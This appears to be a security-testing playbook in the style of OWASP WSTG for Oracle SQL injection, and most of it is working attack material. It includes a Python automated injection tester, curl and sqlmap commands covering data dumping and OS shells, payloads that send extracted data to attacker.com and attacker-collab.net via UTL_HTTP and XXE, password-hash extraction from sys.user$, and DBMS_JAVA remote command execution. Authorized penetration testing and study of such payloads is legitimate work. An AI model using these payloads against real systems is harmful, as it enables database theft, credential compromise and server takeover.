---
name: wstg-inpv-05.1
description: "Testing for SQL Injection - Oracle"
category: input-validation
owasp_id: WSTG-INPV-05.1
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: []
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-inpv-02: "Oracle SQL Injection grants INSERT/UPDATE access to write an unsanitized script payload directly into a stored field, achieving persistent Stored XSS against every user who views the record = Critical (Mass Account Compromise)"
---

# wstg-inpv-05.1

## Test ID

WSTG-INPV-05.1

## Test Name

Testing for SQL Injection - Oracle

## High-Level Description

Oracle-specific SQL injection testing focuses on exploiting Oracle Database features, syntax, and built-in functions. Oracle's unique characteristics include PL/SQL, dual table, specific error messages, and distinct functions that can be leveraged for detection and exploitation.

---

## What to Check

- [ ] Oracle-specific error messages
- [ ] Oracle system tables
- [ ] PL/SQL injection
- [ ] Oracle functions exploitation
- [ ] UTL_HTTP for out-of-band
- [ ] XML functions

---

## How to Test

### Step 1: Oracle Detection

```bash
#!/bin/bash
TARGET="https://target.com/product?id="

# Oracle-specific payloads
echo "[*] Testing for Oracle database..."

# Error-based detection
curl -s "${TARGET}'" | grep -iE "ORA-[0-9]{5}"

# Dual table test (Oracle-specific)
curl -s "${TARGET}1 AND 1=(SELECT 1 FROM DUAL)--"

# Oracle version
curl -s "${TARGET}' UNION SELECT NULL,banner,NULL FROM v\$version--"

# String concatenation (Oracle uses ||)
curl -s "${TARGET}1'||'test"

# Oracle comment syntax
curl -s "${TARGET}1--" | head -20
```

### Step 2: Oracle SQLi Tester

```python
#!/usr/bin/env python3
"""
Oracle SQL Injection Tester
"""

import requests
import re
import time

class OracleSQLiTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # Oracle error patterns
    ORACLE_ERRORS = [
        r"ORA-[0-9][0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_",
        r"Warning.*\Wora_",
        r"oracle\.jdbc",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
    ]

    # Oracle-specific payloads
    ORACLE_PAYLOADS = {
        'error_based': [
            "' AND 1=ctxsys.drithsx.sn(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
            "' AND 1=CTXSYS.DRITHSX.SN(1,'~'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'~')--",
        ],
        'union_based': [
            "' UNION SELECT NULL FROM DUAL--",
            "' UNION SELECT NULL,NULL FROM DUAL--",
            "' UNION SELECT NULL,NULL,NULL FROM DUAL--",
            "' UNION SELECT NULL,banner,NULL FROM v$version--",
            "' UNION SELECT NULL,user,NULL FROM DUAL--",
        ],
        'boolean_based': [
            ("' AND 1=1--", "' AND 1=2--"),
            ("' AND 'a'='a", "' AND 'a'='b"),
            ("1 AND (SELECT COUNT(*) FROM DUAL)=1", "1 AND (SELECT COUNT(*) FROM DUAL)=2"),
        ],
        'time_based': [
            "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--",
            "1 AND DBMS_LOCK.SLEEP(5)=1",
            "' AND (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END FROM DUAL) IS NOT NULL--",
        ],
        'out_of_band': [
            "' AND UTL_HTTP.REQUEST('http://attacker.com/oob?data='||(SELECT user FROM DUAL))=1--",
            "' AND UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL)||'.attacker.com')=1--",
            "' AND (SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://attacker.com/'||(SELECT user FROM DUAL)||'\"> %remote;]>'),'/l') FROM DUAL) IS NOT NULL--",
        ],
    }

    def detect_oracle(self, param):
        """Detect if backend is Oracle"""
        print(f"[*] Detecting Oracle database...")

        detection_payloads = [
            "' AND 1=(SELECT 1 FROM DUAL)--",
            "' UNION SELECT NULL FROM DUAL--",
            "' AND ROWNUM=1--",
            "1'||'test",  # Oracle string concat
        ]

        for payload in detection_payloads:
            try:
                response = self.session.get(self.url, params={param: payload})

                # Check for Oracle errors
                for pattern in self.ORACLE_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] Oracle database detected!")
                        return True

                # Check for successful injection (no error on DUAL query)
                if 'DUAL' in payload and response.status_code == 200:
                    print(f"[+] Oracle likely (DUAL table accessible)")
                    return True

            except Exception as e:
                pass

        return False

    def test_error_based(self, param):
        """Test Oracle error-based injection"""
        print(f"\n[*] Testing Oracle error-based injection...")

        for payload in self.ORACLE_PAYLOADS['error_based']:
            try:
                response = self.session.get(self.url, params={param: payload})

                # Look for Oracle version or data in error
                if re.search(r'Oracle|ORA-|v\$version', response.text, re.IGNORECASE):
                    print(f"[VULN] Error-based SQLi!")
                    print(f"  Payload: {payload[:60]}")
                    self.findings.append({
                        'type': 'Oracle Error-based SQLi',
                        'payload': payload,
                        'severity': 'Critical'
                    })
                    return True

            except Exception as e:
                pass

        return False

    def test_union_based(self, param):
        """Test Oracle UNION-based injection"""
        print(f"\n[*] Testing Oracle UNION-based injection...")

        # First find number of columns
        for i in range(1, 10):
            null_list = ','.join(['NULL'] * i)
            payload = f"' UNION SELECT {null_list} FROM DUAL--"

            try:
                response = self.session.get(self.url, params={param: payload})

                # If no error, we found the column count
                if response.status_code == 200:
                    for pattern in self.ORACLE_ERRORS:
                        if not re.search(pattern, response.text):
                            print(f"[+] Column count: {i}")

                            # Try to extract data
                            data_payload = f"' UNION SELECT {null_list.replace('NULL', 'user', 1)} FROM DUAL--"
                            data_response = self.session.get(self.url, params={param: data_payload})

                            self.findings.append({
                                'type': 'Oracle UNION-based SQLi',
                                'columns': i,
                                'severity': 'Critical'
                            })
                            return True

            except Exception as e:
                pass

        return False

    def test_time_based(self, param):
        """Test Oracle time-based blind injection"""
        print(f"\n[*] Testing Oracle time-based injection...")

        # Baseline time
        start = time.time()
        self.session.get(self.url, params={param: 'test'}, timeout=30)
        baseline = time.time() - start

        for payload in self.ORACLE_PAYLOADS['time_based']:
            try:
                start = time.time()
                self.session.get(self.url, params={param: payload}, timeout=30)
                response_time = time.time() - start

                if response_time > baseline + 4:
                    print(f"[VULN] Time-based SQLi!")
                    print(f"  Payload: {payload[:60]}")
                    print(f"  Response time: {response_time:.2f}s")
                    self.findings.append({
                        'type': 'Oracle Time-based Blind SQLi',
                        'payload': payload,
                        'response_time': response_time,
                        'severity': 'Critical'
                    })
                    return True

            except requests.exceptions.Timeout:
                print(f"[VULN] Time-based SQLi (timeout)!")
                self.findings.append({
                    'type': 'Oracle Time-based Blind SQLi',
                    'payload': payload,
                    'severity': 'Critical'
                })
                return True
            except Exception as e:
                pass

        return False

    def run_tests(self, param='id'):
        """Run all Oracle SQLi tests"""
        if self.detect_oracle(param):
            self.test_error_based(param)
            self.test_union_based(param)
            self.test_time_based(param)

        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("ORACLE SQL INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo Oracle SQLi vulnerabilities found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:70]}")

# Usage
tester = OracleSQLiTester("https://target.com/product")
tester.run_tests(param='id')
```

### Step 3: Oracle Data Extraction

```sql
-- Oracle Version
SELECT banner FROM v$version WHERE ROWNUM=1
SELECT version FROM v$instance

-- Current User
SELECT user FROM DUAL
SELECT SYS_CONTEXT('USERENV','CURRENT_USER') FROM DUAL

-- Database Name
SELECT global_name FROM global_name
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM DUAL

-- List Tables
SELECT table_name FROM all_tables
SELECT table_name FROM user_tables

-- List Columns
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- Extract Data
SELECT username,password FROM users

-- Stacked Queries (requires specific context)
'; EXECUTE IMMEDIATE 'INSERT INTO log VALUES(''injected'')'--

-- File Reading (requires privileges)
SELECT * FROM (SELECT text FROM all_source WHERE name='UTL_FILE')

-- Command Execution (requires JAVA privileges)
-- Create Java class for command execution
-- Execute via DBMS_JAVA.RUNJAVA
```

### Step 4: SQLMap Oracle Commands

```bash
# Detect and exploit Oracle SQLi
sqlmap -u "https://target.com/product?id=1" --dbms=oracle

# Get Oracle version
sqlmap -u "https://target.com/product?id=1" --dbms=oracle --banner

# List databases
sqlmap -u "https://target.com/product?id=1" --dbms=oracle --dbs

# List tables
sqlmap -u "https://target.com/product?id=1" --dbms=oracle -D ORCL --tables

# Dump data
sqlmap -u "https://target.com/product?id=1" --dbms=oracle -D ORCL -T USERS --dump

# OS shell (requires privileges)
sqlmap -u "https://target.com/product?id=1" --dbms=oracle --os-shell
```

---

## Tools

| Tool                 | Purpose               |
| -------------------- | --------------------- |
| SQLMap               | Automated Oracle SQLi |
| Oracle SQL Developer | Database client       |
| Burp Suite           | Manual testing        |

---

## Example Commands/Payloads

### Detection (curl)

```bash
TARGET="https://target.com/product"

# Oracle-specific error trigger (single quote breaks the query)
curl -s "$TARGET?id=1'" | grep -Ei "ORA-[0-9]{5}"

# Confirm Oracle via DUAL table (only Oracle requires FROM clause on SELECT with no table)
curl -s "$TARGET?id=1 UNION SELECT NULL FROM DUAL--"

# Time-based blind (heavy query, no native SLEEP() in Oracle)
time curl -s "$TARGET?id=1' AND 1=DBMS_LOCK.SLEEP(5)--" -o /dev/null
time curl -s "$TARGET?id=1' AND (SELECT COUNT(*) FROM all_users t1,all_users t2,all_users t3)>0--" -o /dev/null
```

### SQLMap (Oracle)

```bash
sqlmap -u "https://target.com/product?id=1" --dbms=oracle --banner
sqlmap -u "https://target.com/product?id=1" --dbms=oracle --dbs
sqlmap -u "https://target.com/product?id=1" --dbms=oracle -D ORCL --tables
sqlmap -u "https://target.com/product?id=1" --dbms=oracle -D ORCL -T USERS --dump
sqlmap -u "https://target.com/product?id=1" --dbms=oracle --os-shell   # requires elevated privileges
```

### Error-Based Data Exfiltration (no visible UNION output needed)

Oracle throws the injected value back inside the error message itself — useful when the app only prints a generic 500 error but leaks the DB exception text:

```sql
-- XMLType error forces the sub-select's value into the exception string
' AND 1337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||'~'||(SELECT banner FROM v$version WHERE ROWNUM=1)||'~'||CHR(62))) FROM DUAL)--

-- CTXSYS.DRITHSX.SN (classic Oracle error-based oracle)
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--

-- DBMS_UTILITY hash-based error extraction
' AND 1337=DBMS_UTILITY.SQLID_TO_SQLHASH('~'||(SELECT user FROM DUAL)||'~')--
```

### Out-of-Band Exfiltration (UTL_HTTP / XXE via XMLType)

```sql
-- Direct outbound HTTP request carrying extracted data in the URL (requires UTL_HTTP execute privilege)
' AND UTL_HTTP.REQUEST('http://attacker-collab.net/'||(SELECT user FROM DUAL))=1--

-- DNS-only exfiltration via XML external entity (no outbound HTTP privilege needed)
' AND (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE r [ <!ENTITY % rmt SYSTEM "http://'||(SELECT user FROM DUAL)||'.attacker-collab.net/"> %rmt;]>'),'/l') FROM DUAL) IS NOT NULL--
```

### Credentials / Privilege Enumeration

```sql
-- Enumerate all database accounts (works on all versions, no privilege needed)
' UNION SELECT username,NULL,NULL FROM all_users--

-- Password hashes (privileged; version-dependent column)
' UNION SELECT name,password,NULL FROM sys.user$--        -- Oracle <= 10g
' UNION SELECT name,spare4,NULL FROM sys.user$--           -- Oracle <= 11g
```

### Java-Based RCE (post-exploitation, requires elevated privileges)

```sql
-- Grant filesystem/exec permissions to the current schema, then run OS commands via DBMS_JAVA
exec dbms_java.grant_permission('SCOTT','SYS:java.io.FilePermission','<<ALL FILES>>','execute');
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper /bin/bash -c "id>/tmp/OUT.LST"') FROM DUAL;
```

### Detection Pattern

| Signal | Meaning |
| ------ | ------- |
| `ORA-00933`, `ORA-01756`, `ORA-00936` in response | Error-based SQLi, confirms Oracle backend |
| Payload requires `FROM DUAL` to succeed where MySQL/PostgreSQL equivalents don't | Oracle-specific SQL dialect confirmed |
| `UTL_HTTP.REQUEST` / `DBMS_LDAP.INIT` out-of-band callback received | Blind/OOB SQLi confirmed via network side-channel |
| DNS lookup for `<extracted-data>.attacker-collab.net` received without UTL_HTTP privilege | XMLType XXE-based OOB exfiltration confirmed |
| `XMLType`/`CTXSYS.DRITHSX.SN` error string contains the injected sub-select value | Error-based exfiltration channel confirmed, bypasses lack of UNION output |

---

## Remediation

```java
// Java - PreparedStatement for Oracle
String query = "SELECT * FROM users WHERE id = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setInt(1, userId);
ResultSet rs = pstmt.executeQuery();
```

```python
# Python - cx_Oracle with bind variables
import cx_Oracle

cursor = connection.cursor()
cursor.execute("SELECT * FROM users WHERE id = :id", {'id': user_id})
```

---

## Risk Assessment

| Finding                         | CVSS | Severity |
| ------------------------------- | ---- | -------- |
| Oracle SQLi with DBA privileges | 9.8  | Critical |
| Oracle SQLi data extraction     | 8.6  | High     |
| Oracle Blind SQLi               | 8.6  | High     |

---

## CWE Categories

| CWE ID     | Title         |
| ---------- | ------------- |
| **CWE-89** | SQL Injection |

---

## References

- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [PortSwigger SQL Injection Cheat Sheet - Oracle](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings - SQL Injection (Oracle)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#oracle)

---

## Checklist

```
[ ] Oracle database detected
[ ] Error-based injection tested
[ ] UNION-based injection tested
[ ] Time-based injection tested
[ ] Out-of-band tested (if possible)
[ ] Data extraction attempted
[ ] Findings documented
```
